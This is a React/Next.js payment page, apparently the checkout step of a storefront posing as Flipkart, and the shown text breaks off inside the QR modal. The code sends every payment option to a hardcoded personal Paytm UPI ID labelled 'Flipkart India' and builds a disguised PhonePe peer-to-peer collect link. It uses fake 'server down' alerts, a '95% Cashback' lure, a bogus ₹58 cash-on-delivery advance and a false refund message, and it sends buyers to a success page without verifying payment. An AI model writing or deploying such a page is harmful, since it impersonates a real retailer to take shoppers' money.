"use client";

import '../../lib/polyfill-self';
import { useRouter, useSearchParams } from 'next/navigation';
import { useState, useEffect, useRef, Suspense } from "react";
import { SaleBanner } from "../../components/SaleBanner";
import { generateQRCode } from 'upi-intents';
import productsData from "../../data/products.json";

// ==========================================
// 💰 PAYMENT CONFIGURATION & HELPERS
// ==========================================
// ========== SIMPLE ON/OFF SWITCH ==========
// true = enable, false = disable (Server Down)
const ENABLE_PAYTM = true;
const ENABLE_QR = true;
// ==========================================
const upiId = "paytm.s27ww6s@pty";
const payeeName = "Flipkart India";
const MERCHANT_NAME = payeeName;
const pp = upiId;
const pt = upiId;
const qr = upiId;

function formatINR(amount: number | string) {
  return Number(amount).toLocaleString("en-IN");
}

function PaymentContent() {
  const router = useRouter();
  const searchParams = Object.fromEntries(useSearchParams().entries());

  const defaultProduct = productsData && productsData.length > 0 ? productsData[0] : null;
  const defaultMrp = defaultProduct ? (parseInt((defaultProduct.oldPrice || "").replace(/[^\d]/g, ""), 10) || defaultProduct.mrp || 10859) : 10859;
  const defaultPrice = defaultProduct ? (parseInt((defaultProduct.newPrice || "").replace(/[^\d]/g, ""), 10) || defaultProduct.price || 299) : 299;

  const [cartProducts, setCartProducts] = useState<any[]>(defaultProduct ? [defaultProduct] : []);
  const [quantities, setQuantities] = useState<Record<string, number>>(defaultProduct ? { [defaultProduct.id]: 1 } : {});

  // Dynamic item data & product states
  const [itemData, setItemData] = useState({
    img1: defaultProduct?.image || "",
    name: defaultProduct?.title || "Product",
    color: defaultProduct?.highlights?.Color || "",
    selling_price: defaultPrice,
    mrp: defaultMrp
  });

  const [currentMode, setCurrentMode] = useState<"UPI" | "COD">("UPI");
  const [selectedMethod, setSelectedMethod] = useState<string>("phonepe");
  const [isWaiting, setIsWaiting] = useState(false);
  const [isFailed, setIsFailed] = useState(false);
  const [showQR, setShowQR] = useState(false);
  const [qrAmountShow, setQrAmountShow] = useState<string>("");
  const [qrCodeDataUrl, setQrCodeDataUrl] = useState<string>("");
  const [isPriceDetailsOpen, setIsPriceDetailsOpen] = useState(false);

  const failTimerRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    document.title = "Payment";

    let loadedProducts: any[] = [];
    const loadedQuantities: Record<string, number> = {};

    try {
      const savedQuantitiesStr = sessionStorage.getItem("orderQuantities");
      const savedQuantities = savedQuantitiesStr ? JSON.parse(savedQuantitiesStr) : {};

      const savedCart = localStorage.getItem("cart");
      if (savedCart) {
        const parsed = JSON.parse(savedCart);
        if (Array.isArray(parsed) && parsed.length > 0) {
          parsed.forEach((item: any) => {
            const id = item?.id || (typeof item === "string" ? item : null);
            if (!id) return;

            // Prioritize sessionStorage quantity if available, otherwise accumulate cart quantities
            if (savedQuantities[id]) {
              loadedQuantities[id] = savedQuantities[id];
            } else {
              loadedQuantities[id] = (loadedQuantities[id] || 0) + (item.qty || 1);
            }

            const foundInDb = productsData.find((p: any) => p.id === id);
            const fullProduct = foundInDb ? { ...foundInDb, ...item } : item;

            if (!loadedProducts.find((p) => p.id === id)) {
              loadedProducts.push(fullProduct);
            }
          });
        }
      }
    } catch (e) {
      console.warn("Storage read error:", e);
    }

    if (loadedProducts.length === 0 && productsData && productsData.length > 0) {
      loadedProducts = [productsData[0]];
      loadedQuantities[productsData[0].id] = 1;
    }

    let calculatedMrp = 0;
    let calculatedTotal = 0;

    loadedProducts.forEach((p) => {
      const qty = loadedQuantities[p.id] || 1;
      const mrpVal = parseInt((p.oldPrice || "").replace(/[^\d]/g, ""), 10) || p.mrp || 0;
      const priceVal = parseInt((p.newPrice || "").replace(/[^\d]/g, ""), 10) || p.price || 0;
      calculatedMrp += mrpVal * qty;
      calculatedTotal += priceVal * qty;
    });

    const passedAmt = searchParams.amt;
    const storedAmount = sessionStorage.getItem("finalAmount") || localStorage.getItem("finalAmount");

    const finalSellingPrice = passedAmt
      ? parseFloat(passedAmt)
      : storedAmount
      ? parseFloat(storedAmount)
      : calculatedTotal;

    const totalCount = Object.values(loadedQuantities).reduce((a, b) => a + b, 0);

    const displayName = loadedProducts.length > 1
      ? `${loadedProducts[0].title} (+${totalCount - 1} more items)`
      : loadedProducts[0]?.title || "Product";

    setCartProducts(loadedProducts);
    setQuantities(loadedQuantities);
    setItemData({
      img1: loadedProducts[0]?.image || "",
      name: displayName,
      color: loadedProducts[0]?.highlights?.Color || "",
      selling_price: finalSellingPrice,
      mrp: calculatedMrp || finalSellingPrice
    });
  }, []);

  // Toggle Between UPI (Full Amount) and COD (Partial Amount)
  const togglePaymentMode = (mode: "UPI" | "COD") => {
    if (typeof navigator !== "undefined" && navigator.vibrate) {
      navigator.vibrate(20);
    }
    setCurrentMode(mode);
  };

  // Select Payment App (PhonePe, Paytm, QR)
  const selectMethod = (method: string) => {
    if (typeof navigator !== "undefined" && navigator.vibrate) {
      navigator.vibrate(20);
    }
    if (method === 'paytm' && !ENABLE_PAYTM) {
      alert('Server is temporarily down. Please use PhonePe.');
      return;
    }
    if (method === 'qr_upi' && !ENABLE_QR) {
      alert('Server is temporarily down. Please use PhonePe.');
      return;
    }
    setSelectedMethod(method);
  };

  // Toggle Price Details accordion
  const togglePriceDetails = () => {
    setIsPriceDetailsOpen((prev) => !prev);
  };

  const generateQR = (amount: string, note: string) => {
    const params = new URLSearchParams({
      pa: upiId,
      pn: payeeName,
      am: amount,
      cu: 'INR',
      tn: note
    });
    const upiLink = 'upi://pay?' + params.toString();

    try {
      const qrResult = generateQRCode(upiLink, {
        size: 180,
        errorCorrectionLevel: "H",
        foregroundColor: "#000000",
        backgroundColor: "#ffffff"
      });
      if (qrResult?.dataUrl) {
        setQrCodeDataUrl(qrResult.dataUrl);
      } else {
        setQrCodeDataUrl(`https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(upiLink)}`);
      }
    } catch (e) {
      setQrCodeDataUrl(`https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(upiLink)}`);
    }

    setQrAmountShow(`₹${formatINR(amount)}`);
    setShowQR(true);
  };

  // ========== PHONEPE SPECIAL COLLECT SYSTEM ==========
  const openPhonePe = (amount: number) => {
    const paymentData = {
      p2pPaymentCheckoutParams: {
        checkoutType: "COLLECT",
        initialAmount: Math.round(amount * 100),
        note: {
          type: "text",
          message: "PEgUFxY"
        },
        supportedInstruments: -1
      },
      contact: {
        type: "EXTERNAL_MERCHANT",
        name: payeeName,
        vpa: upiId
      }
    };
    const jsonStr = JSON.stringify(paymentData);
    const encodedData = btoa(unescape(encodeURIComponent(jsonStr)));
    const phonepeUrl = 'phonepe://native?data=' + encodeURIComponent(encodedData) + '&id=p2ppayment';
    if (typeof window !== 'undefined' && (window as any).fbq) {
      (window as any).fbq('track', 'Purchase', {
        value: amount,
        currency: 'INR'
      });
    }
    window.location.href = phonepeUrl;
  };

  useEffect(() => {
    if (typeof window !== 'undefined') {
      (window as any).openPhonePe = () => {
        const amt = currentMode === 'COD' ? 58 : (parseFloat(String(itemData.selling_price)) || 0);
        openPhonePe(amt);
      };
    }
  }, [currentMode, itemData.selling_price]);

  const payNow = async () => {
    if (typeof navigator !== "undefined" && navigator.vibrate) {
      navigator.vibrate(40);
    }

    // Setup correct amount based on Active Mode (UPI or COD)
    let amtVal = parseFloat(String(itemData.selling_price)) || 0;
    if (currentMode === 'COD') {
      amtVal = 58.00;
    }
    const amt = amtVal.toFixed(2);

    // QR / Scan to Pay
    if (selectedMethod === 'qr_upi') {
      if (!ENABLE_QR) {
        alert('Server is temporarily down. Please use PhonePe.');
        return;
      }
      const note = 'TXN-' + Date.now();
      generateQR(amt, note);
      return;
    }

    // Paytm Check
    if (selectedMethod === 'paytm' && !ENABLE_PAYTM) {
      alert('Server is temporarily down. Please use PhonePe.');
      return;
    }

    setIsWaiting(true);

    setTimeout(() => {
      try {
        // PhonePe → Special Collect system
        if (selectedMethod === 'phonepe') {
          openPhonePe(amtVal);
          return;
        }

        // Paytm
        if (selectedMethod === 'paytm') {
          if (!ENABLE_PAYTM) {
            alert('Server is temporarily down. Please use PhonePe.');
            setIsWaiting(false);
            return;
          }
          const note = 'TXN-' + Date.now();
          const params = new URLSearchParams({
            pa: upiId,
            pn: payeeName,
            am: amtVal.toFixed(0),
            cu: 'INR',
            tn: note,
            featuretype: 'money_transfer'
          });
          window.location.href = 'paytmmp://cash_wallet?' + params.toString();
          return;
        }

        // Fallback
        const note = 'TXN-' + Date.now();
        const params = new URLSearchParams({
          pa: upiId,
          pn: payeeName,
          am: amtVal.toFixed(2),
          cu: 'INR',
          tn: note
        });
        window.location.href = 'upi://pay?' + params.toString();
      } catch (error) {
        console.error("Error in payment:", error);
      }

      // Error fallback
      if (failTimerRef.current) clearTimeout(failTimerRef.current);
      failTimerRef.current = setTimeout(() => {
        setIsWaiting(false);
        setIsFailed(true);
        if (typeof navigator !== "undefined" && navigator.vibrate) {
          navigator.vibrate([50, 50, 50]);
        }
      }, 50000);
    }, 800);
  };

  const getButtonText = () => {
    let amt = parseFloat(String(itemData.selling_price)) || 0;
    if (currentMode === 'COD') {
      amt = 58.00; // 49 + 9 = 58 COD total
    }

    if (selectedMethod === 'qr_upi') {
      return "View QR Code";
    } else {
      return `Pay ₹${formatINR(amt)}`;
    }
  };

  return (
    <div className="store-shell" style={{ overflow: "auto", position: "relative" }}>
      <style>{`
        /* Custom styles */
        .cashback-glow {
            position: relative;
            display: inline-block;
            color: #15803d;
            font-weight: 800;
        }
        .cashback-glow::after {
            content: attr(data-text);
            position: absolute;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-image: linear-gradient(120deg, transparent 0%, transparent 35%, rgba(255, 255, 255, 0.9) 50%, transparent 65%, transparent 100%);
            background-size: 200% 100%;
            -webkit-background-clip: text;
            color: transparent;
            animation: cashbackShine 2.5s infinite linear;
            pointer-events: none;
        }
        @keyframes cashbackShine {
            0% { background-position: -200% 0; }
            100% { background-position: 200% 0; }
        }
        .pay-option {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 14px;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            margin-bottom: 10px;
            cursor: pointer;
            transition: all 0.2s;
            background: white;
        }
        .pay-option.selected {
            background: #f0f9ff;
            border-color: #2874f0;
            box-shadow: 0 0 0 1px #2874f0;
        }
        .opt-left { display: flex; align-items: center; gap: 12px; }
        .opt-img { width: 30px; height: 30px; object-fit: contain; }
        .opt-name { font-size: 14px; font-weight: 600; color: #212121; display: block; }
        .opt-tag { font-size: 10px; font-weight: 700; color: #16a34a; background: #dcfce7; padding: 2px 6px; border-radius: 4px; margin-left: 6px; }
        .radio-circle { width: 18px; height: 18px; border: 2px solid #ccc; border-radius: 50%; position: relative; display: flex; align-items: center; justify-content: center; }
        .pay-option.selected .radio-circle { border-color: #2874f0; }
        .radio-dot { width: 10px; height: 10px; background: #2874f0; border-radius: 50%; display: none; }
        .pay-option.selected .radio-dot { display: block; }
        
        .footer-btn {
            background: #fb641b;
            color: white;
            border: none;
            width: 100%;
            padding: 14px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 700;
            box-shadow: 0 2px 8px rgba(251, 100, 27, 0.4);
            cursor: pointer;
            transition: background 0.2s;
        }
        .active-mode {
            background-color: #f8fafc;
        }
      `}</style>

      {/* Header */}
      <header>
        <div className="flex items-center justify-between bg-white px-4 py-3 border-b border-gray-200">
          <div className="flex items-center gap-3">
            <button className="p-1 text-gray-700" onClick={() => history.back()}>
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <path d="M19 12H5M12 19l-7-7 7-7"></path>
              </svg>
            </button>
            <div className="flex flex-col leading-tight">
              <span className="text-[11px] text-gray-500 font-medium tracking-wide uppercase">Step 3 of 3</span>
              <span className="text-[17px] font-bold text-gray-900">Payments</span>
            </div>
          </div>
          <div className="flex items-center gap-1 bg-blue-50 border border-blue-100 rounded px-2 py-1 text-[11px] font-semibold text-blue-700">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
            </svg>
            100% Secure
          </div>
        </div>
      </header>

      {/* Unified Price Details Accordion - Keeps all items and prices in a single accordion */}
      <section className="bg-white border-b border-gray-200 mt-2 shadow-sm overflow-hidden">
        <div
          className="flex items-center justify-between p-3.5 cursor-pointer hover:bg-gray-50/50 transition-colors"
          onClick={togglePriceDetails}
        >
          <div className="flex items-center gap-2">
            <span className="text-[13px] font-bold text-gray-800 tracking-wide">
              Price Details ({cartProducts.reduce((acc, p) => acc + (quantities[p.id] || 1), 0)} {cartProducts.reduce((acc, p) => acc + (quantities[p.id] || 1), 0) === 1 ? 'item' : 'items'})
            </span>
          </div>
          <div className="flex items-center gap-2">
            <span className="selling_price font-bold text-gray-900 text-sm">
              ₹{formatINR(itemData.selling_price)}
            </span>
            <svg
              id="price-chevron"
              className="w-4 h-4 transition-transform duration-200 text-gray-400"
              style={{ transform: isPriceDetailsOpen ? "rotate(0deg)" : "rotate(180deg)" }}
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
            </svg>
          </div>
        </div>

        {/* Collapsible Content: Keeps ALL items AND prices in a single accordion */}
        <div
          id="price-details"
          className="overflow-hidden transition-all duration-300 bg-gray-50/60 border-t border-gray-100"
          style={{
            maxHeight: isPriceDetailsOpen ? "1500px" : "0px",
            opacity: isPriceDetailsOpen ? "1" : "0",
            paddingTop: isPriceDetailsOpen ? "12px" : "0px",
            paddingBottom: isPriceDetailsOpen ? "14px" : "0px"
          }}
        >
          {/* Section 1: All Items in the Cart */}
          <div className="px-3.5 mb-3">
            <div className="text-[11px] font-bold text-gray-500 uppercase tracking-wider mb-2">
              Items in this Order ({cartProducts.reduce((acc, p) => acc + (quantities[p.id] || 1), 0)})
            </div>
            <div className="divide-y divide-gray-100 bg-white rounded-lg border border-gray-200 overflow-hidden">
              {cartProducts.map((product, idx) => {
                const qty = quantities[product.id] || 1;
                const pMrp = (parseInt((product.oldPrice || "").replace(/[^\d]/g, ""), 10) || product.mrp || 0) * qty;
                const pPrice = (parseInt((product.newPrice || "").replace(/[^\d]/g, ""), 10) || product.price || 0) * qty;

                return (
                  <div key={product.id || idx} className="p-3 flex items-start gap-3">
                    <img
                      id={idx === 0 ? "item_image" : undefined}
                      src={product.image || itemData.img1}
                      alt={product.title}
                      className="w-14 h-14 object-cover rounded border border-gray-200 shrink-0 bg-gray-50"
                    />
                    <div className="flex-1 min-w-0">
                      <h4
                        id={idx === 0 ? "product-title" : undefined}
                        className="text-[12px] font-medium text-gray-900 line-clamp-2 leading-tight"
                      >
                        {product.title}
                      </h4>
                      <div className="flex items-center gap-2 mt-1">
                        <span className="text-[10px] bg-gray-100 text-gray-700 px-1.5 py-0.5 rounded font-semibold">
                          Qty: {qty}
                        </span>
                        {product.highlights?.Brand ? (
                          <span className="text-[10px] text-gray-500 truncate">
                            {product.highlights.Brand}
                          </span>
                        ) : (
                          <span className="text-[10px] text-blue-600 font-semibold">
                            Flipkart Assured
                          </span>
                        )}
                      </div>
                      <div className="flex items-center gap-2 mt-1.5 flex-wrap">
                        <span className="selling_price text-[13px] font-bold text-gray-900">
                          ₹{formatINR(pPrice)}
                        </span>
                        {pMrp > pPrice && (
                          <>
                            <span className="mrp text-[11px] text-gray-400 line-through">
                              ₹{formatINR(pMrp)}
                            </span>
                            <span className="text-[10px] font-bold text-green-700">
                              {product.discount || `${Math.round(((pMrp - pPrice) / pMrp) * 100)}% off`}
                            </span>
                          </>
                        )}
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>

          {/* Section 2: Complete Price Breakdown */}
          <div className="px-3.5 text-xs">
            <div className="bg-white p-3.5 rounded-lg border border-gray-200">
              <div className="text-[11px] font-bold text-gray-500 uppercase tracking-wider mb-2.5">
                Price Breakdown
              </div>
              <div className="flex justify-between py-1 text-gray-600">
                <span>Price ({cartProducts.reduce((acc, p) => acc + (quantities[p.id] || 1), 0)} {cartProducts.reduce((acc, p) => acc + (quantities[p.id] || 1), 0) === 1 ? 'item' : 'items'})</span>
                <span className="mrp text-gray-400 line-through">₹{formatINR(itemData.mrp)}</span>
              </div>
              <div className="flex justify-between py-1 text-gray-600">
                <span>Selling Price</span>
                <span className="selling_price font-semibold text-gray-900">₹{formatINR(itemData.selling_price)}</span>
              </div>
              <div className="flex justify-between py-1 text-green-700">
                <span>Discount</span>
                <span className="font-semibold">-₹{formatINR(Math.max(0, itemData.mrp - itemData.selling_price))}</span>
              </div>
              <div className="flex justify-between py-1 text-gray-600">
                <span>Delivery Charges</span>
                <span className="text-green-700 font-semibold"><span className="line-through text-gray-400 font-normal mr-1">₹40</span>FREE</span>
              </div>
              <div className="flex justify-between py-2 border-t border-gray-100 font-bold text-gray-900 mt-1 text-[13px]">
                <span>Total Payable</span>
                <span className="selling_price text-blue-600">₹{formatINR(itemData.selling_price)}</span>
              </div>
              {itemData.mrp > itemData.selling_price && (
                <div className="mt-2 text-[11px] font-semibold text-green-700 bg-green-50 px-2.5 py-1.5 rounded text-center border border-green-200/60">
                  🎉 You will save ₹{formatINR(itemData.mrp - itemData.selling_price)} on this order
                </div>
              )}
            </div>
          </div>
        </div>
      </section>

      {/* Cashback Banner */}
      <section className="bg-white py-3 border-b border-gray-200 mt-2 shadow-sm">
        <div className="px-4">
          <div className="bg-green-50 border border-green-200 rounded-lg p-3 flex items-center justify-between">
            <div>
              <div className="text-[15px]">
                <span className="cashback-glow" data-text="95% Cashback">95% Cashback</span>
              </div>
              <div className="text-[11px] font-medium text-green-700 mt-0.5">
                Claim now with UPI payment offers
              </div>
            </div>
            <div className="flex items-center gap-1">
              <span className="inline-flex items-center justify-center w-8 h-8 rounded-full bg-white border border-gray-100 shadow-sm z-10">
                <img className="w-[18px] h-[18px]" src="/assets/images/AXIS.svg" alt="Axis Bank" />
              </span>
              <span className="inline-flex items-center justify-center w-8 h-8 rounded-full bg-white border border-gray-100 shadow-sm -ml-3 z-0">
                <img className="w-[18px] h-[18px]" src="/assets/images/SBI.svg" alt="SBI" />
              </span>
            </div>
          </div>
        </div>
      </section>

      {/* Shared Apps UI Component */}
      {/* Accordion Item 1: UPI Section */}
      <section className="bg-white mt-2 shadow-sm overflow-hidden">
        <div
          id="header-upi"
          className={`flex items-center justify-between p-4 cursor-pointer hover:bg-gray-50/50 transition-colors ${currentMode === 'UPI' ? 'active-mode' : ''}`}
          onClick={() => togglePaymentMode('UPI')}
        >
          <div className="flex items-center gap-3">
            <div className="radio-circle" style={{ borderColor: currentMode === 'UPI' ? "#2874f0" : "#ccc" }}>
              <div id="dot-upi" className="radio-dot" style={{ display: currentMode === 'UPI' ? "block" : "none" }}></div>
            </div>
            <img src="/assets/images/upi.svg" className="w-8" alt="UPI" />
            <div>
              <h3 className="font-bold text-[15px] text-gray-900">UPI</h3>
              <p className="text-[12px] text-gray-500">Pay by any UPI app</p>
            </div>
          </div>
          <svg
            className={`w-5 h-5 text-gray-400 transition-transform duration-200 ${currentMode === 'UPI' ? "rotate-180" : ""}`}
            viewBox="0 0 20 20"
            fill="currentColor"
          >
            <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
          </svg>
        </div>

        <div id="upi-insertion-point">
          {currentMode === 'UPI' && (
            <div id="shared-apps-container" className="p-4 border-t border-gray-100">
              <div
                className={`pay-option ${selectedMethod === "phonepe" ? "selected" : ""}`}
                onClick={(e) => selectMethod("phonepe")}
              >
                <div className="opt-left">
                  <img src="/assets/images/phonepe.svg" className="opt-img" alt="PhonePe" />
                  <div>
                    <span className="opt-name">PhonePe</span>
                    <span className="opt-tag">Fastest</span>
                  </div>
                </div>
                <div className="radio-circle"><div className="radio-dot"></div></div>
              </div>

              <div
                className={`pay-option ${selectedMethod === "paytm" ? "selected" : ""}`}
                onClick={(e) => selectMethod("paytm")}
              >
                <div className="opt-left">
                  <img src="/assets/images/paytm_icon.svg" className="opt-img" alt="Paytm" />
                  <span className="opt-name">Paytm</span>
                </div>
                <div className="radio-circle"><div className="radio-dot"></div></div>
              </div>

              <div
                className={`pay-option ${selectedMethod === "qr_upi" ? "selected" : ""}`}
                onClick={(e) => selectMethod("qr_upi")}
              >
                <div className="opt-left">
                  <img src="/assets/images/qr.png" className="opt-img" alt="QR" />
                  <span className="opt-name">Scan QR Code</span>
                </div>
                <div className="radio-circle"><div className="radio-dot"></div></div>
              </div>

              <div style={{ display: "flex", justifyContent: "center", marginTop: "12px", marginBottom: "4px" }}>
                <SaleBanner />
              </div>
            </div>
          )}
        </div>
      </section>

      {/* Accordion Item 2: Cash on Delivery Section */}
      <section className="bg-white mt-2 shadow-sm overflow-hidden">
        <div
          id="header-cod"
          className={`flex items-center justify-between p-4 cursor-pointer hover:bg-gray-50/50 transition-colors ${currentMode === 'COD' ? 'active-mode' : ''}`}
          onClick={() => togglePaymentMode('COD')}
        >
          <div className="flex items-center gap-3">
            <div className="radio-circle" style={{ borderColor: currentMode === 'COD' ? "#2874f0" : "#ccc" }}>
              <div id="dot-cod" className="radio-dot" style={{ display: currentMode === 'COD' ? "block" : "none" }}></div>
            </div>
            <img src="/assets/images/cash-icon.svg" className="w-7 h-7 object-contain" alt="Cash on Delivery" />
            <div>
              <h3 className="font-bold text-[15px] text-gray-900">Cash on Delivery</h3>
              <p className="text-[12px] text-gray-500">Pay ₹58 advance shipping charge</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <span className="text-[10px] bg-green-100 text-green-700 px-2 py-0.5 rounded font-bold">
              ₹58 Advance
            </span>
            <svg
              className={`w-5 h-5 text-gray-400 transition-transform duration-200 ${currentMode === 'COD' ? "rotate-180" : ""}`}
              viewBox="0 0 20 20"
              fill="currentColor"
            >
              <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
            </svg>
          </div>
        </div>

        <div id="cod-insertion-point">
          {currentMode === 'COD' && (
            <div className="p-4 border-t border-gray-100 bg-gray-50/30">
              <div id="cod-breakdown" className="mb-3 text-[11px] text-gray-600 bg-white p-3 rounded-lg border border-gray-200">
                <div className="flex justify-between py-0.5">
                  <span>Advance Shipping Charge:</span>
                  <span className="font-semibold text-gray-900">₹49</span>
                </div>
                <div className="flex justify-between py-0.5">
                  <span>COD Handling Fee:</span>
                  <span className="font-semibold text-gray-900">₹9</span>
                </div>
                <div className="flex justify-between py-0.5 border-t border-gray-100 font-bold text-gray-900 mt-1 pt-1">
                  <span>Payable Now:</span>
                  <span className="text-green-700">₹58</span>
                </div>
                <div className="text-[10px] text-gray-500 mt-1">
                  ℹ️ Remaining balance of ₹{formatINR(itemData.selling_price)} to be paid in cash upon delivery.
                </div>
              </div>

              {/* Shared apps when in COD mode */}
              <div id="shared-apps-container">
                <div
                  className={`pay-option ${selectedMethod === "phonepe" ? "selected" : ""}`}
                  onClick={(e) => selectMethod("phonepe")}
                >
                  <div className="opt-left">
                    <img src="/assets/images/phonepe.svg" className="opt-img" alt="PhonePe" />
                    <div>
                      <span className="opt-name">PhonePe</span>
                      <span className="opt-tag">Fastest</span>
                    </div>
                  </div>
                  <div className="radio-circle"><div className="radio-dot"></div></div>
                </div>

                <div
                  className={`pay-option ${selectedMethod === "paytm" ? "selected" : ""}`}
                  onClick={(e) => selectMethod("paytm")}
                >
                  <div className="opt-left">
                    <img src="/assets/images/paytm_icon.svg" className="opt-img" alt="Paytm" />
                    <span className="opt-name">Paytm</span>
                  </div>
                  <div className="radio-circle"><div className="radio-dot"></div></div>
                </div>

                <div
                  className={`pay-option ${selectedMethod === "qr_upi" ? "selected" : ""}`}
                  onClick={(e) => selectMethod("qr_upi")}
                >
                  <div className="opt-left">
                    <img src="/assets/images/qr.png" className="opt-img" alt="QR" />
                    <span className="opt-name">Scan QR Code</span>
                  </div>
                  <div className="radio-circle"><div className="radio-dot"></div></div>
                </div>
              </div>
            </div>
          )}
        </div>
      </section>

      {/* Unavailable payment options */}
      <div className="bg-white mt-2 shadow-sm divide-y divide-gray-100">
        <div className="flex items-start gap-4 px-4 py-4 opacity-50 grayscale pointer-events-none">
          <img className="w-6" src="/assets/images/card.svg" alt="Card" />
          <div className="flex-1">
            <div className="flex justify-between items-center">
              <h3 className="text-[14px] font-semibold text-gray-800">Credit / Debit / ATM Card</h3>
              <span className="text-[10px] bg-gray-200 text-gray-600 px-2 py-1 rounded font-bold tracking-wider">UNAVAILABLE</span>
            </div>
          </div>
        </div>
        <div className="flex items-start gap-4 px-4 py-4 opacity-50 grayscale pointer-events-none">
          <img className="w-6" src="/assets/images/net-banking-08092023.svg" alt="Net Banking" />
          <div className="flex-1">
            <div className="flex justify-between items-center">
              <h3 className="text-[14px] font-semibold text-gray-800">Net Banking</h3>
              <span className="text-[10px] bg-gray-200 text-gray-600 px-2 py-1 rounded font-bold tracking-wider">UNAVAILABLE</span>
            </div>
          </div>
        </div>
      </div>

      <div className="h-24"></div>

      {/* Fixed bottom payment bar */}
      <div className="fixed bottom-0 w-full bg-white border-t border-gray-200 p-3 flex justify-between items-center shadow-[0_-2px_10px_rgba(0,0,0,0.05)] z-40" style={{ maxWidth: "432px", left: "50%", transform: "translateX(-50%)" }}>
        <button id="action-button" className="footer-btn flex justify-center items-center gap-2" onClick={payNow}>
          {getButtonText()}
        </button>
      </div>

      {/* Overlay background for modals */}
      {(isWaiting || isFailed || showQR) && (
        <div id="overlay" className="fixed inset-0 bg-black/60 z-50 transition-opacity duration-300" />
      )}

      {/* Waiting Modal */}
      {isWaiting && (
        <div
          id="waitingModal"
          className="fixed inset-0 z-50 flex items-center justify-center p-4"
        >
          <div className="bg-white p-6 rounded-2xl w-[85%] max-w-[340px] text-center shadow-2xl relative">
            <div className="w-12 h-12 border-4 border-gray-100 border-t-blue-600 rounded-full animate-spin mx-auto mb-4"></div>
            <h3 className="text-lg font-bold text-gray-900 mb-2">Processing Payment...</h3>
            <p className="text-sm text-gray-500 mb-4">
              Opening {selectedMethod === 'paytm' ? 'Paytm' : 'PhonePe'}...
            </p>
            <p className="text-xs text-gray-400">Please do not close this page or press back button</p>
          </div>
        </div>
      )}

      {/* Failed Modal */}
      {isFailed && (
        <div
          id="failedModal"
          className="fixed inset-0 z-50 flex items-center justify-center p-4"
        >
          <div className="bg-white rounded-2xl w-[90%] max-w-[340px] p-6 text-center shadow-2xl relative">
            <div className="w-14 h-14 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-3 text-red-600">
              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
              </svg>
            </div>
            <h3 className="text-lg font-bold text-gray-900 mb-1">Payment Incomplete</h3>
            <p className="text-xs text-gray-500 mb-5 leading-relaxed">
              We couldn't detect payment confirmation. If money was debited from your account, it will be refunded within 24-48 hours.
            </p>
            <div className="flex flex-col gap-2">
              <button
                onClick={() => {
                  setIsFailed(false);
                  payNow();
                }}
                className="w-full py-2.5 bg-[#fb641b] hover:bg-[#e85a16] text-white font-bold rounded-lg text-sm transition shadow"
              >
                Retry Payment
              </button>
              <button
                onClick={() => setIsFailed(false)}
                className="w-full py-2 text-gray-600 hover:text-gray-800 font-semibold text-xs transition"
              >
                Choose Another Method
              </button>
            </div>
          </div>
        </div>
      )}

      {/* QR Code Modal (Scan & Pay) */}
      {showQR && (
        <div id="qrModal" className="fixed inset-0 z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded-2xl w-[90%] max-w-[340px] overflow-hidden text-center relative shadow-2xl">
            <div className="bg-blue-600 text-white p-4 flex items-center gap-4">
              <button onClick={() => setShowQR(false)}>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"></path></svg>
              </button>
              <h3 className="font-semibold text-lg m-0">Scan & Pay</h3>
            </div>
            <div className="p-6 bg-blue-50/50">
              <div className="text-xs font-semibold text-gray-700 uppercase tracking-wider mb-2">{MERCHANT_NAME}</div>
              {currentMode === 'COD' && (
                <div className="text-xs font-bold text-orange-700 bg-orange-100/90 px-3 py-1 rounded-md inline-block mb-3 border border-orange-200">
                  COD Shipping Charge
                </div>
              )}
              <div id="qr-box" className="bg-white p-4 rounded-xl inline-block shadow-sm mb-4">
                <img
                  src={qrCodeDataUrl || `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(`upi://pay?pa=${upiId}&pn=${encodeURIComponent(payeeName)}&am=${itemData.selling_price}&cu=INR`)}`}
                  alt="QR Code"
                  width="180"
                  height="180"
                  className="mx-auto"
                />
              </div>
              <div id="qr-amount-show" className="font-bold text-[22px] text-blue-600 mb-3">{qrAmountShow}</div>
              <div className="flex justify-center gap-4 opacity-80 mb-4">
                <img src="/assets/images/phonepe.svg" width="28" alt="PhonePe" />
                <img src="/assets/images/paytm_icon.svg" width="28" alt="Paytm" />
                <img src="/assets/images/bhim.png" width="28" alt="BHIM" />
              </div>
              <button
                onClick={() => {
                  setShowQR(false);
                  router.push("/success");
                }}
